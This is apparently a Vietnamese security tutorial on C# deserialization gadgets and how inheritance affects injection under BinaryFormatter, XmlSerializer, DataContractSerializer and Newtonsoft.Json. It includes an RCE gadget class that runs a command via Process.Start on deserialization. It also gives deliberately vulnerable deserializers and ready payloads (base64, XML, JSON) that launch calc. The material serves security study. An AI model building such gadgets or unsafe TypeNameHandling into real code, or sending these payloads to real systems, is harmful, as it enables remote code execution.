# **DESERIALIZATION TRONG C# GADGET (CLASS EXTENDS CLASS)**

Bài trước là các điều kiện của từng formatter để có thể trigger được gadget. Ở bài này, ta đi sâu vào việc phân tích các kiểu dữ liệu, quan hệ kế thừa, implement,... để có thể gài được gadget vào property mong muốn. Như đã nói tại formatter, hầu như ta sẽ phải xác định được object graph, từ đó mới có thể đưa gadget vào.

Đối với một class `A` có khai báo một thuộc tính object (hoặc tương tự), một class `B` nào đó kế thừa class `A` sẽ đều có thuộc tính object đó (trừ việc scope là `private`). Do đó việc deserialize theo kiểu dữ liệu `A` hay `B` thì đều có khả năng trigger được gadget một cách dễ dàng. Nhưng, ta giả thiết một số trường hợp sau:
  * `A` không có kiểu dữ liệu object, `B` kế thừa `A` và tự định nghĩa kiểu dữ liệu object. Thực hiện deserialize theo `A`.
  * `A` có kiểu dữ liệu object với scope là `private`, `B` kế thừa `A`. Thực hiện deserialize theo `B`.

Theo lý thuyết, cả 2 trường hợp bên trên đều không có có chỗ để gài payload, một người anh đã hỏi mình về case này, do bài trước không tìm hiểu sâu về gadget nên đã confirm là không trigger được. Nhưng, đối với một số formatter thì 2 trường hợp trên hoàn toàn có thể thực hiện trigger bình thường.

Gadget để RCE vẫn sẽ như bài trước nhưng ta sẽ bổ sung một điều kiện kiểm tra `null` tại hàm `Run()`:

```C#
using System;
using System.Runtime.Serialization;

namespace RCENs
{
	[Serializable]
	public class RCE
	{
		public RCE() { }

		public RCE(SerializationInfo info, StreamingContext context) { }

		public RCE(string text)
		{
			this._cmd = text;
		}

		private string _cmd;

		public string cmd
		{
			get
			{
				return this._cmd;
			}
			set
			{
				this._cmd = value;
				//this.Run();
			}
		}

		private void Run()
		{
			if (!string.IsNullOrEmpty(this._cmd))
			{
				System.Diagnostics.Process.Start(this._cmd);
			}
		}

		[OnDeserializing]
		public void During(StreamingContext context) { }

		[OnDeserialized]
		public void Done(StreamingContext context)
		{
			this.Run();
		}

		public void OnDeserialization(object sender) { }

		public void GetObjectData(SerializationInfo info, StreamingContext context) { }
	}
}
```

### ***`BinaryFormatter`***

`BinaryFormatter` không có bất cứ hành động nào để kiếm tra kiểu dữ liệu trước khi deserialize mà chỉ kiểm tra trong khi thực hiện deser, cộng với điều kiện trigger gadget của nó không có nhiều khó khăn nên việc deser theo `A` hay theo `B` gần như sẽ tương đương nhau. Đáng ra formatter này sẽ không được nhắc đến trong bài viết hôm nay, nhưng trong lúc kiểm tra lại `Binder` của nó, một số thứ khá là thú vị đã xảy ra.

```C#
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;

namespace BinFormatNs
{
	[Serializable]
	public class BinFormat
	{
		public BinFormat(string text)
		{ }
	}

	[Serializable]
	public class CBinFormat : BinFormat
	{
		public CBinFormat(string text) : base(text)
		{
			this.strProp = text
		}

		public string strProp
		{
			set
			{ }
		}
	}

	public class Binder : SerializationBinder
	{
		public override Type BindToType(string assemblyName, string typeName)
		{
			if (typeName == "RCENs.RCE")
				return typeof(RCENs.RCE);
			return typeof(int);
			// return typeof(Datetime);
			// return typeof(BinFormat);
			// return null;
		}
	}

	public class Go
	{
		public static string Serial(MemoryStream stream, string text)
		{
			CBinFormat a = new CBinFormat(text);
			BinaryFormatter format = new BinaryFormatter();
			format.Serialize(stream, a);
			return Convert.ToBase64String(stream.ToArray());
		}

		public static T Deserial<T>(string value) where T : class
		{
			byte[] buffer = Convert.FromBase64String(value);
			BinaryFormatter format = new BinaryFormatter();
			format.Binder = new Binder();
			MemoryStream serialStream = new MemoryStream(buffer);
			T result = format.Deserialize(serialStream) as T;
			return result;
		}
	}
}

// "AAEAAAD/////AQAAAAAAAAAMAgAAAEBmb3JtYXR0ZXIsIFZlcnNpb249MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsBQEAAAAWQmluRm9ybWF0TnMuQ0JpbkZvcm1hdAEAAAAYPHN0clByb3A+a19fQmFja2luZ0ZpZWxkAgIAAAAJAwAAAAUDAAAACVJDRU5zLlJDRQEAAAAEX2NtZAECAAAABgQAAAAEY2FsYws="
```

Đầu tiên, điều kiện bắt buộc vẫn là resolve được kiểu dữ liệu `RCENs.RCE` khi gặp, nhưng các kiểu dữ liệu còn lại thì có thể thay thế bằng rất nhiều thứ khác như `int`, `float`, `DateTime`,... (ngoại trừ `string`, các kiểu `Array`, các `abstract class`,...). Mặc dù đã đọc source của `mscorlib` nhưng mình vẫn chưa có lời giải thích chính xác nhất cho điều này, sẽ có update để giải thích thỏa đáng nhất.

### ***`XmlSerializer`***

Ở bài trước, điều kiện để RCE là phải điều khiển được kiểu dữ liệu đầu vào, hay nói cách khác là `XmlSerializer.mapping` chứa kiểu dữ liệu đó. Ở đây ta sẽ đưa trực tiếp vào các kiểu dữ liệu cần thiết cho từng trường hợp đã nêu phía trên.

  * *`A` không có kiểu dữ liệu object, `B` kế thừa `A` và tự định nghĩa kiểu dữ liệu object. Thực hiện deserialize theo `A`*: Trường hợp này không chạy.

  * *`A` có kiểu dữ liệu object với scope là `private`, `B` kế thừa `A`. Thực hiện deserialize theo `B`*: Dễ dàng để nhận biết trường hợp này không chạy vì `XmlSerializer` chỉ (de)serialize các property có scope là public (đã nêu tại bài trước).

Như vậy điều kiện để RCE vẫn không thay đổi. Việc kế thừa một `abstract class` cũng tương tự.

### ***`DataContractSerializer`***

Bài viết không đề cập đến `Resolver` hay `Surrogated` mà mặc định formatter đã biết được kiểu dữ liệu của gadget rồi để tránh việc loãng, gây rối.

  * *`A` không có kiểu dữ liệu object, `B` kế thừa `A` và tự định nghĩa kiểu dữ liệu object. Thực hiện deserialize theo `A`*: Trường hợp này không chạy.
  * *`A` có kiểu dữ liệu object với scope là `private`, `B` kế thừa `A`. Thực hiện deserialize theo `B`*. Tại đây ta chia ra làm 2 trường hợp nhỏ:
    * Kiểu dữ liệu object có thuộc tính `DataMember`: Có chạy
    * Ngược lại, không có thuộc tính `DataMember`: Có chạy. Nhưng các trường sẽ bị đổi tên gây khó khăn trong việc tự build payload

```C#
using System;
using System.IO;
using System.Xml;
using System.Text;
using System.Runtime.Serialization;

namespace DataConNs
{
	[DataContract]
	// [Serializable]
	[KnownType(typeof(RCENs.RCE))]
	public class DataCon
	{
		public DataCon()
		{
			this.obj = "obj";
			this.id = "id";
		}

		[DataMember]
		private string id;

		[DataMember]
		private object obj { get; set; }
	}

	public class CDataCon : DataCon
	{
		public CDataCon() : base()
		{ }
	}

	public class Go
	{
		public static string Serial(MemoryStream stream)
		{
			DataCon a = new DataCon();
			DataContractSerializer format = new DataContractSerializer(typeof(DataCon));
			format.WriteObject(stream, a);
			return Encoding.UTF8.GetString(stream.ToArray());
		}

		public static T Deserial<T>(string value) where T : class
		{
			byte[] buffer = Encoding.UTF8.GetBytes(value);
			DataContractSerializer format = new DataContractSerializer(typeof(T));
			MemoryStream serialStream = new MemoryStream(buffer);
			object a = format.ReadObject(serialStream);
			return a as T;
		}
	}
}
/*
DataMember: "<CDataCon xmlns=\"http://schemas.datacontract.org/2004/07/DataConNs\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"><id i:nil=\"true\"/><obj i:type=\"a:RCE\" xmlns:a=\"http://schemas.datacontract.org/2004/07/RCENs\"><a:_cmd>calc</a:_cmd></obj></CDataCon>"

Serializable: "<DataCon xmlns=\"http://schemas.datacontract.org/2004/07/DataConNs\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"><_x003C_obj_x003E_k__BackingField i:type=\"a:RCE\" xmlns:a=\"http://schemas.datacontract.org/2004/07/RCENs\"><a:_cmd>calc</a:_cmd></_x003C_obj_x003E_k__BackingField><id>123</id></DataCon>"
*/
```

Việc deserialize về một `abstract class` sẽ gây lỗi.

### ***`Newtonsoft.Json.JsonConvert`***

Các trường object sẽ được cài đặt `TypeNameHandling.All` để thuận tiện trong quá trình deserialize

  * *`A` không có kiểu dữ liệu object, `B` kế thừa `A` và tự định nghĩa kiểu dữ liệu object. Thực hiện deserialize theo `A`*: Chạy được với điều kiện `TypeNameHandling` của serializer khác `None`. Khi đó sẽ đưa vào kiểu dữ liệu `B` để deser thay vì kiểu dữ liệu `A`

```C#
using System.IO;
using Newtonsoft.Json;

namespace JsonNs
{
	public class Json
	{
		public Json()
		{
			this.id = "id";
		}

		public string id
		{
			get;
			set;
		}
	}

	public class CJson : Json
	{
		public CJson() : base()
		{
			this.obj = "obj";
		}

		public object obj { get; set; }
	}

	public class Go
	{
		public static string Serial(MemoryStream stream)
		{
			CJson a = new CJson();
			return JsonConvert.SerializeObject(a);
		}

		public static T Deserial<T>(string value) where T : class
		{
			// T == typeof(Json)
			T a = JsonConvert.DeserializeObject<T>(value, new JsonSerializerSettings() { TypeNameHandling = TypeNameHandling.Auto });
			return a;
		}
	}
}

// "{\"$type\":\"JsonNs.CJson, formatter\",\"obj\":{\"$type\":\"RCENs.RCE, formatter\",\"cmd\":\"calc\"},\"id\":\"id\"}"
```

  * *`A` có kiểu dữ liệu object với scope là `private`, `B` kế thừa `A`. Thực hiện deserialize theo `B`*: Có chạy kể cả trong trường hợp `TypeNameHandling` của serializer là `None`.

```C#
using System.IO;
using Newtonsoft.Json;

namespace JsonNs
{
	public class Json
	{
		public Json()
		{
			this.id = "id";
			this.obj = "obj";
		}

		public string id
		{
			get;
			set;
		}

		[JsonProperty(TypeNameHandling = TypeNameHandling.All)]
		private object obj;
	}

	public class CJson : Json
	{
		public CJson() : base()
		{ }
	}

	public class Go
	{
		public static string Serial(MemoryStream stream)
		{
			CJson a = new CJson();
			return JsonConvert.SerializeObject(a);
		}

		public static T Deserial<T>(string value) where T : class
		{
			// T == typeof(CJson)
			T a = JsonConvert.DeserializeObject<T>(value);
			return a;
		}
	}
}

// "{\"obj\":{\"$type\":\"RCENs.RCE, formatter\",\"cmd\":\"calc\"},\"id\":\"id\"}"
```

Cả 2 trường hợp đều chạy được với `abstract class`.
